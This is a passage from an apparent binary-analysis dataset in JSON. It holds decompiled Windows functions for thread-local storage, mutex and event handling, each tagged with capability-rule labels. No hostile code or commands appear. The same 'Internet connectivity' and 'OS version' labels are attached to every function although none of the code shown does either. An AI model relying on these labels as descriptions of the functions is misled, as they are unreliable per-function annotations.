*(*piVar8 + 8 + uVar11 * 0x10)) {\n                if (iVar6 == 0) {\n                    iVar6 = fcn.140008fc0();\n                    if (*(iVar6 + 0x68) == 0) {\n                        iVar6 = *piVar1;\n                        goto code_r0x0001400047a4;\n                    }\ncode_r0x000140004868:\n                    iVar6 = *piVar1;\n                    if (iVar6 != 0) goto code_r0x0001400047b3;\n                    fcn.140008fc0();\n                    iVar6 = *piVar1;\n                    uVar7 = uVar11 + 1;\n                    if (iVar6 != 0) goto code_r0x0001400047b3;\n                    iVar4 = fcn.140008fc0();\n                    iVar6 = *piVar1;\n                    if (*(iVar4 + 0x70) == 0) goto code_r0x0001400047be;\n                    if (iVar6 != 0) goto code_r0x000140004a80;\n                    iVar4 = fcn.140008fc0();\n                    iVar6 = *piVar1;\n                    if (uVar7 <= **(iVar4 + 0x70) && **(iVar4 + 0x70) != uVar7) {\n                        iVar4 = uVar7 * 0x10;\n                        if (iVar6 != 0) goto code_r0x000140004a8d;\n                        iVar12 = fcn.140008fc0();\n                        iVar6 = *piVar1;\n                        if (*(iVar12 + 0x70) == 0) goto code_r0x000140004a94;\n                        if (iVar6 != 0) goto code_r0x000140004b02;\n                        iVar12 = fcn.140008fc0();\n                        iVar6 = *piVar1;\n                        iVar12 = (**(iVar12 + 0x70) - uVar7) * 0x10;\n                        if (iVar6 != 0) goto code_r0x000140004aa9;\n                        iVar14 = fcn.140008fc0();\n                        iVar6 = *piVar1;\n                        if (*(iVar14 + 0x68) == 0) goto code_r0x000140004b88;\n                        if (iVar6 != 0) goto code_r0x000140004ab4;\n                        iVar14 = fcn.140008fc0();\n                        iVar6 = *piVar1;\n                        iVar14 = **(iVar14 + 0x68) + iVar4;\n                        if (iVar6 == 0) {\n                            iVar5 = fcn.140008fc0();\n                            iVar6 = *piVar1;\n                            if (*(iVar5 + 0x68) == 0) goto code_r0x000140004bd9;\n                            if (iVar6 == 0) {\n                                iVar6 = fcn.140008fc0();\n                            }\n                            goto code_r0x000140004ac5;\n                        }\n                        if (*(iVar6 + 0x68) != 0) goto code_r0x000140004ac5;\ncode_r0x000140004bd9:\n                        *(iVar6 + 0x68) = 0x14001b1b8;\n                        piVar8 = 0x14001b1b8;\n                        goto code_r0x000140004ac9;\n                    }\ncode_r0x000140004ae0:\n                    if (iVar6 != 0) goto code_r0x0001400047d6;\n                    iVar6 = fcn.140008fc0();\n                    if (*(iVar6 + 0x70) != 0) goto code_r0x000140004970;\n                    iVar6 = *piVar1;\ncode_r0x0001400047e1:\n                    piVar8 = 0x14001b1b0;\n                    *(iVar6 + 0x70) = 0x14001b1b0;\ncode_r0x0001400047ec:\n                    *piVar8 = *piVar8 + -1;\ncode_r0x0001400047f0:\n                    if (*(iVar6 + 0x70) == 0) {\ncode_r0x0001400047fb:\n                        piVar8 = 0x14001b1b0;\n                        *(iVar6 + 0x70) = 0x14001b1b0;\n                    }\n                    else {\ncode_r0x000140004a70:\n                        piVar8 = *(iVar6 + 0x70);\n                    }\n                    if (*piVar8 != 0) break;\ncode_r0x000140004810:\n                    if (*(iVar6 + 0x68) == 0) goto code_r0x000140004bbb;\ncode_r0x00014000481b:\n                    puVar9 = *(iVar6 + 0x68);\n                }\n                else {\n                    if (*(iVar6 + 0x68) != 0) goto code_r0x000140004868;\ncode_r0x0001400047a4:\n                    *(iVar6 + 0x68) = 0x14001b1b8;\ncode_r0x0001400047b3:\n                    if (*(iVar6 + 0x70) == 0) {\ncode_r0x0001400047be:\n                        uVar7 = *0x14001b1b0;\n                        *(iVar6 + 0x70) = 0x14001b1b0;\n                        if (uVar11 + 1 < uVar7) {\ncode_r0x000140004b02:\n                            piVar8 = *(iVar6 + 0x70);\n                            goto code_r0x000140004a9f;\n                        }\n                    }\n                    else {\ncode_r0x000140004a80:\n                        if (uVar11 + 1 < **(iVar6 + 0x70)) {\ncode_r0x000140004a8d:\n                            if (*(iVar6 + 0x70) != 0) goto code_r0x000140004b02;\ncode_r0x000140004a94:\n                            piVar8 = 0x14001b1b0;\n                            *(iVar6 + 0x70) = 0x14001b1b0;\ncode_r0x000140004a9f:\n                            iVar12 = (*piVar8 - (uVar11 + 1)) * 0x10;\ncode_r0x000140004aa9:\n                            if (*(iVar6 + 0x68) == 0) {\ncode_r0x000140004b88:\n                                piVar8 = 0x14001b1b8;\n                                *(iVar6 + 0x68) = 0x14001b1b8;\n                            }\n                            else {\ncode_r0x000140004ab4:\n                                piVar8 = *(iVar6 + 0x68);\n                            }\n                            iVar4 = (uVar11 + 1) * 0x10;\n                            iVar14 = *piVar8 + iVar4;\ncode_r0x000140004ac5:\n                            piVar8 = *(iVar6 + 0x68);\ncode_r0x000140004ac9:\n                            sub.msvcrt.dll_memmove(*piVar8 + -0x10 + iVar4, iVar14, iVar12);\n                            iVar6 = *piVar1;\n                            goto code_r0x000140004ae0;\n                        }\n                    }\ncode_r0x0001400047d6:\n                    if (*(iVar6 + 0x70) == 0) goto code_r0x0001400047e1;\ncode_r0x000140004970:\n                    iVar6 = *piVar1;\n                    if (iVar6 != 0) {\n                        piVar8 = *(iVar6 + 0x70);\n                        goto code_r0x0001400047ec;\n                    }\n                    iVar4 = fcn.140008fc0();\n                    iVar6 = *piVar1;\n                    **(iVar4 + 0x70) = **(iVar4 + 0x70) + -1;\n                    if (iVar6 != 0) goto code_r0x0001400047f0;\n                    iVar4 = fcn.140008fc0();\n                    iVar6 = *piVar1;\n                    if (*(iVar4 + 0x70) == 0) goto code_r0x0001400047fb;\n                    if (iVar6 != 0) goto code_r0x000140004a70;\n                    iVar6 = fcn.140008fc0();\n                    if (**(iVar6 + 0x70) != 0) break;\n                    iVar6 = *piVar1;\n                    if (iVar6 != 0) goto code_r0x000140004810;\n                    iVar4 = fcn.140008fc0();\n                    iVar6 = *piVar1;\n                    if (*(iVar4 + 0x68) != 0) {\n                        if (iVar6 == 0) {\n                            iVar6 = fcn.140008fc0();\n                        }\n                        goto code_r0x00014000481b;\n                    }\ncode_r0x000140004bbb:\n                    *(iVar6 + 0x68) = 0x14001b1b8;\n                    puVar9 = 0x14001b1b8;\n                }\n                sub.msvcrt.dll_free(*puVar9);\n                iVar6 = *piVar1;\n                if (iVar6 == 0) {\n                    iVar4 = fcn.140008fc0();\n                    iVar6 = *piVar1;\n                    if (*(iVar4 + 0x78) == 0) goto code_r0x000140004bab;\n                    if (iVar6 != 0) goto code_r0x00014000483f;\n                    iVar6 = fcn.140008fc0();\n                    puVar9 = *(iVar6 + 0x78);\n                    iVar6 = *piVar1;\n                    *puVar9 = 0;\n                    if (iVar6 != 0) goto code_r0x00014000484a;\n                    iVar4 = fcn.140008fc0();\n                    iVar6 = *piVar1;\n                    if (*(iVar4 + 0x70) != 0) {\n                        if (iVar6 == 0) {\n                            iVar6 = fcn.140008fc0();\n                        }\n                        goto code_r0x000140004855;\n                    }\ncode_r0x000140004b98:\n                    *(iVar6 + 0x70) = 0x14001b1b0;\n                    puVar10 = 0x14001b1b0;\n                }\n                else {\n                    if (*(iVar6 + 0x78) == 0) {\ncode_r0x000140004bab:\n                        puVar9 = 0x14001b1a8;\n                        *(iVar6 + 0x78) = 0x14001b1a8;\n                    }\n                    else {\ncode_r0x00014000483f:\n                        puVar9 = *(iVar6 + 0x78);\n                    }\n                    *puVar9 = 0;\ncode_r0x00014000484a:\n                    if (*(iVar6 + 0x70) == 0) goto code_r0x000140004b98;\ncode_r0x000140004855:\n                    puVar10 = *(iVar6 + 0x70);\n                }\n                *puVar10 = *puVar9;\n                break;\n            }\n            if (iVar6 == 0) {\n                iVar4 = fcn.140008fc0();\n                iVar6 = *piVar1;\n                if (*(iVar4 + 0x68) != 0) {\n                    if (iVar6 == 0) {\n                        iVar6 = fcn.140008fc0();\n                    }\n                    goto code_r0x00014000460e;\n                }\ncode_r0x000140004658:\n                *(iVar6 + 0x68) = 0x14001b1b8;\n                piVar8 = 0x14001b1b8;\n            }\n            else {\n                if (*(iVar6 + 0x68) == 0) goto code_r0x000140004658;\ncode_r0x00014000460e:\n                piVar8 = *(iVar6 + 0x68);\n            }\n            if (uVar7 < *(*piVar8 + 8 + uVar11 * 0x10)) {\n                if (uVar11 == uVar13) break;\n                uVar15 = uVar11 - 1;\n            }\n            else {\n                uVar13 = uVar11 + 1;\n            }\n            if (uVar15 < uVar13) break;\n            iVar6 = *piVar1;\n        } while( true );\n    }\ncode_r0x000140004382:\n    if (arg1[10] != 0) {\n        sub.msvcrt.dll_free();\n    }\n    if (arg1[0xb] != 0) {\n        sub.msvcrt.dll_free();\n    }\n    if (arg1[0xc] != 0) {\n        sub.msvcrt.dll_free();\n    }\n    *arg1 = 0;\n    arg1[0x3b] = 0;\n    puVar9 = arg1 + 1 & 0xfffffffffffffff8;\n    for (uVar7 = (arg1 - (arg1 + 1 & 0xfffffffffffffff8)) + 0x1e0U >> 3; uVar7 != 0; uVar7 = uVar7 - 1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    iVar6 = *piVar1;\n    if (iVar6 == 0) {\n        iVar4 = fcn.140008fc0();\n        iVar6 = *piVar1;\n        if (*(iVar4 + 0x58) == 0) goto code_r0x0001400043f2;\n        if (iVar6 != 0) goto code_r0x0001400044b0;\n        iVar6 = fcn.140008fc0();\n        if (**(iVar6 + 0x58) == 0) {\n            iVar6 = *piVar1;\n            if (iVar6 != 0) goto code_r0x0001400044be;\n            iVar4 = fcn.140008fc0();\n            iVar6 = *piVar1;\n            if (*(iVar4 + 0x58) == 0) goto code_r0x0001400044c9;\n            if (iVar6 != 0) goto code_r0x000140004638;\n            iVar6 = fcn.140008fc0();\n            puVar9 = *(iVar6 + 0x58);\n            iVar6 = *piVar1;\n            *puVar9 = arg1;\n            if (iVar6 != 0) goto code_r0x0001400044d7;\n            iVar6 = fcn.140008fc0();\n            iVar4 = *(iVar6 + 0x50);\n            iVar6 = *piVar1;\n            goto code_r0x0001400044df;\n        }\n        iVar6 = *piVar1;\n        if (iVar6 != 0) goto code_r0x000140004407;\n        iVar4 = fcn.140008fc0();\n        iVar6 = *piVar1;\n        if (*(iVar4 + 0x58) == 0) goto code_r0x000140004412;\n        if (iVar6 != 0) goto code_r0x000140004520;\n        iVar4 = fcn.140008fc0();\n        iVar6 = *piVar1;\n        *(**(iVar4 + 0x58) + 0x1d0) = arg1;\n        if (iVar6 != 0) goto code_r0x000140004427;\n        iVar4 = fcn.140008fc0();\n        iVar6 = *piVar1;\n        if (*(iVar4 + 0x58) == 0) goto code_r0x000140004540;\n        if (iVar6 != 0) goto code_r0x000140004432;\n        iVar6 = fcn.140008fc0();\n        puVar9 = *(iVar6 + 0x58);\n        iVar6 = *piVar1;\n    }\n    else {\n        if (*(iVar6 + 0x58) == 0) {\ncode_r0x0001400043f2:\n            *(iVar6 + 0x58) = 0x14001b1c0;\n            iVar4 = *0x14001b1c0;\n        }\n        else {\ncode_r0x0001400044b0:\n            iVar4 = **(iVar6 + 0x58);\n        }\n        if (iVar4 == 0) {\ncode_r0x0001400044be:\n            if (*(iVar6 + 0x58) == 0) {\ncode_r0x0001400044c9:\n                puVar9 = 0x14001b1c0;\n                *(iVar6 + 0x58) = 0x14001b1c0;\n            }\n            else {\ncode_r0x000140004638:\n                puVar9 = *(iVar6 + 0x58);\n            }\n            *puVar9 = arg1;\ncode_r0x0001400044d7:\n            iVar4 = *(iVar6 + 0x50);\ncode_r0x0001400044df:\n            if (iVar4 == 0) {\n                puVar10 = 0x14001b1c8;\n                *(iVar6 + 0x50) = 0x14001b1c8;\n            }\n            else if (iVar6 == 0) {\n                iVar6 = fcn.140008fc0();\n                puVar10 = *(iVar6 + 0x50);\n                iVar6 = *piVar1;\n            }\n            else {\n                puVar10 = *(iVar6 + 0x50);\n            }\n            *puVar10 = *puVar9;\n            goto joined_r0x00014000443c;\n        }\ncode_r0x000140004407:\n        if (*(iVar6 + 0x58) == 0) {\ncode_r0x000140004412:\n            piVar8 = 0x14001b1c0;\n            *(iVar6 + 0x58) = 0x14001b1c0;\n        }\n        else {\ncode_r0x000140004520:\n            piVar8 = *(iVar6 + 0x58);\n        }\n        *(*piVar8 + 0x1d0) = arg1;\ncode_r0x000140004427:\n        if (*(iVar6 + 0x58) == 0) {\ncode_r0x000140004540:\n            puVar9 = 0x14001b1c0;\n            *(iVar6 + 0x58) = 0x14001b1c0;\n        }\n        else {\ncode_r0x000140004432:\n            puVar9 = *(iVar6 + 0x58);\n        }\n    }\n    *puVar9 = arg1;\njoined_r0x00014000443c:\n    if (iVar6 == 0) {\n        iVar6 = fcn.140008fc0();\n        iVar4 = *(iVar6 + 0x60);\n        iVar6 = *piVar1;\n    }\n    else {\n        iVar4 = *(iVar6 + 0x60);\n    }\n    if (iVar4 == 0) {\n        arg1_01 = 0x140016078;\n        *(iVar6 + 0x60) = 0x140016078;\n    }\n    else {\n        if (iVar6 == 0) {\n            iVar6 = fcn.140008fc0();\n        }\n        arg1_01 = *(iVar6 + 0x60);\n    }\n    arg2 = *arg1_01;\n    if (arg2 + 3U < 4) {\n        arg2 = fcn.140009570(arg1_01, arg2);\n    }\n    if (arg2 == NULL) {\n        return 0xc;\n    }\n    if (arg2[1] != 0) {\n        if (*arg2 == 0) {\n            return 0x16;\n        }\n        iVar3 = arg2[5];\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        if (iVar3 != iVar2) {\n            return 1;\n        }\n        if (arg2[4] != 0) {\n            arg2[4] = arg2[4] + -1;\n            return 0;\n        }\n        arg2[5] = -1;\n    }\n    iVar3 = *arg2;\n    *arg2 = 0;\n    uVar7 = 0;\n    if (iVar3 == 2) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_SetEvent)(*(arg2 + 2));\n        uVar7 = iVar3 == 0;\n    }\n    return uVar7;\n}\n",
        "token_count": 5780
    },
    "140004ca": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.140004ca0(void)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    ulong uVar7;\n    ulong uVar8;\n    ulong uVar9;\n    uint *puVar10;\n    int64_t iVar11;\n    int32_t *arg1;\n    \n    piVar1 = *0x1400183a0;\n    iVar5 = **0x1400183a0;\n    if (iVar5 == 0) {\n        iVar6 = fcn.140008fc0();\n        iVar5 = *piVar1;\n        if (*(iVar6 + 0x28) == 0) goto code_r0x000140004cc8;\n        if (iVar5 != 0) goto code_r0x000140004e78;\n        iVar5 = fcn.140008fc0();\n        arg1 = *(iVar5 + 0x28);\n        if (*arg1 != 1) goto code_r0x000140004cdc;\ncode_r0x000140004ce1:\n        iVar5 = *piVar1;\n        if (iVar5 != 0) goto code_r0x000140004ce9;\n        iVar6 = fcn.140008fc0();\n        iVar5 = *piVar1;\n        if (*(iVar6 + 0x30) == 0) goto code_r0x000140004cf0;\n        if (iVar5 == 0) {\n            iVar5 = fcn.140008fc0();\n        }\ncode_r0x000140004d40:\n        iVar5 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(**(iVar5 + 0x30));\n    }\n    else {\n        if (*(iVar5 + 0x28) == 0) {\ncode_r0x000140004cc8:\n            iVar4 = *0x14001b1d8;\n            arg1 = 0x14001b1d8;\n            *(iVar5 + 0x28) = 0x14001b1d8;\n        }\n        else {\ncode_r0x000140004e78:\n            arg1 = *(iVar5 + 0x28);\n            iVar4 = *arg1;\n        }\n        if (iVar4 != 1) {\ncode_r0x000140004cdc:\n            fcn.1400042b0(arg1);\n            goto code_r0x000140004ce1;\n        }\n        iVar5 = *piVar1;\ncode_r0x000140004ce9:\n        if (*(iVar5 + 0x30) != 0) goto code_r0x000140004d40;\ncode_r0x000140004cf0:\n        *(iVar5 + 0x30) = 0x140016088;\n        iVar5 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*0x140016088);\n    }\n    if (((iVar5 != 0) || (iVar6 = fcn.140003df0(),  *0x14001e050 == 0)) || (iVar6 == 0)) {\n        return iVar5;\n    }\n    *(iVar6 + 0x44) = 1;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    *(iVar6 + 0x70) = uVar3;\n    uVar7 = (*_sym.imp.KERNEL32.dll_CreateEventA)(0, 1, 0, 0);\n    *(iVar6 + 0x38) = 0xffffffffffffffff;\n    *(iVar6 + 0x30) = uVar7;\n    iVar4 = fcn.14000ae60(iVar6 + 0x68);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetCurrentProcess;\n    if (iVar4 == 1) {\n        fcn.140004180();\n        *(**0x1400183a0 + 0x10) = 0x14001b1e8;\n        return 0x14001b1e8;\n    }\n    *(iVar6 + 0x68) = 0xffffffffffffffff;\n    *(iVar6 + 0xb8) = 0;\n    *(iVar6 + 0x28) = 0;\n    uVar7 = (*pcVar2)();\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetCurrentThread)();\n    uVar9 = (*pcVar2)();\n    iVar4 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar9, uVar8, uVar7, iVar6 + 0x28, 0, 0, 2);\n    if (iVar4 == 0) goto code_r0x000140015096;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetThreadPriority)(*(iVar6 + 0x28));\n    *(iVar6 + 0xbc) = 0;\n    *(iVar6 + 0xc0) = uVar3;\n    *(iVar6 + 0x40) = *(iVar6 + 0x40) & 0xcf | 0x10;\n    iVar5 = *piVar1;\n    if (iVar5 == 0) {\n        iVar11 = fcn.140008fc0();\n        iVar5 = *piVar1;\n        if (*(iVar11 + 0x30) != 0) {\n            if (iVar5 == 0) {\n                iVar5 = fcn.140008fc0();\n            }\n            goto code_r0x000140004e4a;\n        }\ncode_r0x000140004ec0:\n        *(iVar5 + 0x30) = 0x140016088;\n        puVar10 = 0x140016088;\n    }\n    else {\n        if (*(iVar5 + 0x30) == 0) goto code_r0x000140004ec0;\ncode_r0x000140004e4a:\n        puVar10 = *(iVar5 + 0x30);\n    }\n    iVar4 = (*_sym.imp.KERNEL32.dll_TlsSetValue)(*puVar10, iVar6);\n    if (iVar4 != 0) {\n        return iVar6;\n    }\ncode_r0x000140015096:\n    sub.msvcrt.dll_abort();\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 1395
    },
    "1400050f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.1400050f0(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    ulong arg1_00;\n    \n    piVar1 = *0x1400183a0;\n    if (arg1 == 0) {\n        return 0;\n    }\n    iVar3 = **0x1400183a0;\n    if (iVar3 == 0) {\n        iVar2 = fcn.140008fc0();\n        iVar3 = *piVar1;\n        if (*(iVar2 + 0x60) != 0) {\n            if (iVar3 == 0) {\n                iVar3 = fcn.140008fc0();\n            }\n            goto code_r0x000140005180;\n        }\ncode_r0x000140005119:\n        uVar4 = 0x140016078;\n        *(iVar3 + 0x60) = 0x140016078;\n    }\n    else {\n        if (*(iVar3 + 0x60) == 0) goto code_r0x000140005119;\ncode_r0x000140005180:\n        uVar4 = *(iVar3 + 0x60);\n    }\n    fcn.1400095f0(uVar4);\n    uVar4 = fcn.140002ac0(arg1);\n    iVar3 = *piVar1;\n    if (iVar3 == 0) {\n        iVar2 = fcn.140008fc0();\n        iVar3 = *piVar1;\n        if (*(iVar2 + 0x60) == 0) goto code_r0x000140005190;\n        if (iVar3 == 0) {\n            iVar3 = fcn.140008fc0();\n        }\n    }\n    else if (*(iVar3 + 0x60) == 0) {\ncode_r0x000140005190:\n        arg1_00 = 0x140016078;\n        *(iVar3 + 0x60) = 0x140016078;\n        goto code_r0x000140005147;\n    }\n    arg1_00 = *(iVar3 + 0x60);\ncode_r0x000140005147:\n    fcn.140009910(arg1_00);\n    return uVar4;\n}\n",
        "token_count": 508
    },
    "1400051e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.1400051e0(ulong arg1)\n\n{\n    ulong *arg1_00;\n    uint64_t uVar1;\n    int64_t *piVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    int64_t *piVar7;\n    ulong uVar8;\n    uint32_t uVar9;\n    uint32_t uStack80;\n    int32_t iStack76;\n    \n    uVar3 = fcn.1400050f0(arg1);\n    iStack76 = 0x100;\n    arg1_00 = uVar3 + 0x68;\n    uVar6 = uVar3;\n    if (uVar3 != 0) {\n        do {\n            fcn.14000ae70(arg1_00);\n            piVar2 = *0x1400183a0;\n            if (*(uVar3 + 0x48) == 0) {\n                *arg1_00 = 0xffffffffffffffff;\n                return 0;\n            }\n            uStack80 = 0;\n            uVar6 = 0;\n            do {\n                if (*(*(uVar3 + 0x58) + uVar6) != '\\0') {\n                    uVar8 = *(*(uVar3 + 0x50) + uVar6 * 8);\n                    iVar5 = *piVar2;\n                    if (iVar5 == 0) {\n                        iVar4 = fcn.140008fc0();\n                        iVar5 = *piVar2;\n                        if (*(iVar4 + 0x38) != 0) {\n                            if (iVar5 == 0) {\n                                iVar5 = fcn.140008fc0();\n                            }\n                            goto code_r0x0001400052a2;\n                        }\ncode_r0x000140005388:\n                        *(iVar5 + 0x38) = 0x140016080;\n                        fcn.14000a6e0(0x140016080);\n                        iVar5 = *piVar2;\n                        if (iVar5 != 0) goto code_r0x0001400052b7;\ncode_r0x0001400053a0:\n                        iVar4 = fcn.140008fc0();\n                        iVar5 = *piVar2;\n                        if (*(iVar4 + 0x10) != 0) {\n                            if (iVar5 == 0) {\n                                iVar5 = fcn.140008fc0();\n                            }\n                            goto code_r0x0001400052c2;\n                        }\ncode_r0x000140005370:\n                        *(iVar5 + 0x10) = 0x14001b1e8;\n                        piVar7 = 0x14001b1e8;\n                    }\n                    else {\n                        if (*(iVar5 + 0x38) == 0) goto code_r0x000140005388;\ncode_r0x0001400052a2:\n                        fcn.14000a6e0(*(iVar5 + 0x38));\n                        iVar5 = *piVar2;\n                        if (iVar5 == 0) goto code_r0x0001400053a0;\ncode_r0x0001400052b7:\n                        if (*(iVar5 + 0x10) == 0) goto code_r0x000140005370;\ncode_r0x0001400052c2:\n                        piVar7 = *(iVar5 + 0x10);\n                    }\n                    uVar1 = *(*piVar7 + uVar6 * 8);\n                    *(uVar6 * 8 + *(uVar3 + 0x50)) = 0;\n                    *(*(uVar3 + 0x58) + uVar6) = 0;\n                    if (uVar1 < 2) {\n                        iVar5 = *piVar2;\n                        if (iVar5 == 0) goto code_r0x000140005331;\ncode_r0x00014000524c:\n                        if (*(iVar5 + 0x38) != 0) goto code_r0x000140005257;\ncode_r0x000140005360:\n                        *(iVar5 + 0x38) = 0x140016080;\n                        uVar8 = 0x140016080;\n                    }\n                    else {\n                        fcn.14000aeb0(arg1_00);\n                        iVar5 = *piVar2;\n                        if (iVar5 == 0) {\n                            iVar4 = fcn.140008fc0();\n                            iVar5 = *piVar2;\n                            if (*(iVar4 + 0x10) != 0) {\n                                if (iVar5 == 0) {\n                                    iVar5 = fcn.140008fc0();\n                                }\n                                goto code_r0x000140005307;\n                            }\ncode_r0x0001400053f8:\n                            *(iVar5 + 0x10) = 0x14001b1e8;\n                            piVar7 = 0x14001b1e8;\n                        }\n                        else {\n                            if (*(iVar5 + 0x10) == 0) goto code_r0x0001400053f8;\ncode_r0x000140005307:\n                            piVar7 = *(iVar5 + 0x10);\n                        }\n                        (**(*piVar7 + uVar6 * 8))(uVar8);\n                        fcn.14000ae70(arg1_00);\n                        iVar5 = *piVar2;\n                        uStack80 = 1;\n                        if (iVar5 != 0) goto code_r0x00014000524c;\ncode_r0x000140005331:\n                        iVar4 = fcn.140008fc0();\n                        iVar5 = *piVar2;\n                        if (*(iVar4 + 0x38) == 0) goto code_r0x000140005360;\n                        if (iVar5 == 0) {\n                            iVar5 = fcn.140008fc0();\n                        }\ncode_r0x000140005257:\n                        uVar8 = *(iVar5 + 0x38);\n                    }\n                    fcn.14000aa50(uVar8);\n                }\n                uVar9 = uVar6 + 1;\n                uVar6 = uVar9;\n            } while (uVar9 < *(uVar3 + 0x48));\n            fcn.14000aeb0(arg1_00);\n            uVar6 = uStack80;\n            if (uStack80 == 0) {\n                return uVar6;\n            }\n            iStack76 = iStack76 + -1;\n        } while (iStack76 != 0);\n    }\n    return uVar6;\n}\n",
        "token_count": 1449
    },
    "1400057f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400057f0(uint *param_1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    ulong uVar8;\n    int32_t *arg1;\n    ulong arg1_00;\n    ulong var_10h;\n    \n    fcn.140001d80();\n    piVar2 = *0x1400183a0;\n    iVar6 = **0x1400183a0;\n    if (iVar6 == 0) {\n        iVar7 = fcn.140008fc0();\n        iVar6 = *piVar2;\n        if (*(iVar7 + 0x60) == 0) goto code_r0x000140005823;\n        if (iVar6 == 0) {\n            iVar6 = fcn.140008fc0();\n        }\ncode_r0x000140005a57:\n        uVar8 = *(iVar6 + 0x60);\n    }\n    else {\n        if (*(iVar6 + 0x60) != 0) goto code_r0x000140005a57;\ncode_r0x000140005823:\n        uVar8 = 0x140016078;\n        *(**0x1400183a0 + 0x60) = 0x140016078;\n    }\n    fcn.1400095f0(uVar8);\n    fcn.1400095f0(param_1 + 0xe);\n    piVar2 = *0x1400183a0;\n    iVar6 = **0x1400183a0;\n    if (iVar6 == 0) {\n        iVar7 = fcn.140008fc0();\n        iVar6 = *piVar2;\n        if (*(iVar7 + 0x28) == 0) goto code_r0x00014000586b;\n        if (iVar6 != 0) goto code_r0x000140005a60;\n        iVar6 = fcn.140008fc0();\n        arg1 = *(iVar6 + 0x28);\n        if (*arg1 != 1) goto code_r0x000140005889;\ncode_r0x00014000588e:\n        piVar2 = *0x1400183a0;\n        iVar6 = **0x1400183a0;\n        if (iVar6 != 0) goto code_r0x0001400058a1;\n        iVar7 = fcn.140008fc0();\n        iVar6 = *piVar2;\n        if (*(iVar7 + 0x30) == 0) goto code_r0x0001400058ac;\n        if (iVar6 == 0) {\n            iVar6 = fcn.140008fc0();\n        }\ncode_r0x000140005a73:\n        puVar5 = *(iVar6 + 0x30);\n    }\n    else {\n        if (*(iVar6 + 0x28) == 0) {\ncode_r0x00014000586b:\n            arg1 = 0x14001b1d8;\n            *(**0x1400183a0 + 0x28) = 0x14001b1d8;\n        }\n        else {\ncode_r0x000140005a60:\n            arg1 = *(iVar6 + 0x28);\n        }\n        if (*arg1 != 1) {\ncode_r0x000140005889:\n            fcn.1400042b0(arg1);\n            goto code_r0x00014000588e;\n        }\n        iVar6 = **0x1400183a0;\ncode_r0x0001400058a1:\n        if (*(iVar6 + 0x30) != 0) {\n            iVar6 = **0x1400183a0;\n            goto code_r0x000140005a73;\n        }\ncode_r0x0001400058ac:\n        puVar5 = 0x140016088;\n        *(**0x1400183a0 + 0x30) = 0x140016088;\n    }\n    (*_sym.imp.KERNEL32.dll_TlsSetValue)(*puVar5, param_1);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    param_1[0x1c] = uVar3;\n    fcn.140009910(param_1 + 0xe);\n    iVar4 = sub.msvcrt.dll__setjmp(param_1 + 0x34, &stack0xfffffffffffffff8);\n    piVar2 = *0x1400183a0;\n    if (iVar4 == 0) {\n        iVar6 = **0x1400183a0;\n        if (iVar6 == 0) {\n            iVar7 = fcn.140008fc0();\n            iVar6 = *piVar2;\n            if (*(iVar7 + 0x60) == 0) goto code_r0x00014000591b;\n            if (iVar6 == 0) {\n                iVar6 = fcn.140008fc0();\n            }\ncode_r0x000140005b34:\n            uVar8 = *(iVar6 + 0x60);\n        }\n        else {\n            if (*(iVar6 + 0x60) != 0) goto code_r0x000140005b34;\ncode_r0x00014000591b:\n            uVar8 = 0x140016078;\n            *(iVar6 + 0x60) = 0x140016078;\n        }\n        fcn.140009910(uVar8);\n        if (*(param_1 + 4) == NULL) {\n            uVar8 = 0x80;\n        }\n        else {\n            uVar8 = (**(param_1 + 4))(*(param_1 + 2));\n        }\n        piVar2 = *0x1400183a0;\n        iVar6 = **0x1400183a0;\n        if (iVar6 == 0) {\n            iVar7 = fcn.140008fc0();\n            iVar6 = *piVar2;\n            if (*(iVar7 + 0x60) == 0) goto code_r0x00014000596a;\n            if (iVar6 == 0) {\n                iVar6 = fcn.140008fc0();\n            }\ncode_r0x000140005b80:\n            arg1_00 = *(iVar6 + 